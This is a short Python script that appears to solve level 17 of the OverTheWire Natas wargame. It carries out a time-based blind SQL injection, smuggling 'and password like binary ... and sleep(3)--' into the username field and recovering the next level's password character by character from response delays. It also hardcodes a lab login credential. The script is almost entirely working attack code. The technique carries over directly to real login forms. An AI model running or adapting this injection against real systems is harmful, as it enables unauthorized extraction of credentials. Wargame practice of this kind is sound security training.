#! /usr/bin/python3
import requests
import sys
from requests.auth import HTTPBasicAuth
import time

YELLOW = "\033[93m"
ENDC = "\033[0m"

url = "http://natas17.natas.labs.overthewire.org/index.php?debug=true"
auth = HTTPBasicAuth("natas17","8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")

all_chars_and_numbers = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
temp_password = ""
password = ""

while True:
    for char in all_chars_and_numbers:
        temp_password = password + char
        query = 'natas18" and password like binary \"{}%\" and sleep(3)-- '.format(temp_password)
        start = time.time() # check if the execution takes more than 3 seconds
        response = requests.post(url,data={'username':query},auth=auth)
        end = time.time()
        print(YELLOW + "executing: {}".format(query) + ENDC)
        if(end-start >= 3):
            password += char
            sys.stdout.write("\r{}".format(password))
            if(len(password) == 32):
                print("password is: {}".format(password))
                sys.exit(0)
            break
